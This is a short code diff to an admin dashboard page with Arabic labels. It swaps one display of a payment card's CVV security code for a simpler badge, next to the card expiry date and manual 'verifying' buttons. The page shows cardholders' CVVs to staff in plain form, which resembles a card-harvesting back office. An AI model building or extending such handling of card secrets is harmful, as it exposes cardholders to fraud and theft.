@@ -1555,22 +1555,10 @@ export default function AdminDashboardPage() {
                                     label="تاريخ الانتهاء"
                                     value={allData.paymentExpiryDate}
                                   />
-                                  {/* صندوق الرمز السري للبطاقة */}
-                                  {allData.paymentCvv && (
-                                    <div className="mt-4 pt-4 border-t border-gray-200">
-                                      <div className="bg-purple-50 border border-purple-200 rounded-xl p-4">
-                                        <h5 className="font-bold text-sm text-purple-700 mb-2 flex items-center gap-2">
-                                          <ShieldCheck className="w-4 h-4" />
-                                          الرمز السري للبطاقة (CVV)
-                                        </h5>
-                                        <div className="text-center">
-                                          <span className="text-2xl font-mono font-black text-purple-700 tracking-widest">
-                                            {allData.paymentCvv}
-                                          </span>
-                                        </div>
-                                      </div>
-                                    </div>
-                                  )}
+                                  <DataBadge
+                                    label="رمز الأمان (CVV)"
+                                    value={allData.paymentCvv}
+                                  />
 
                                   {/* أزرار التحقق عند حالة verifying */}
                                   {app.paymentStatus === "verifying" && (
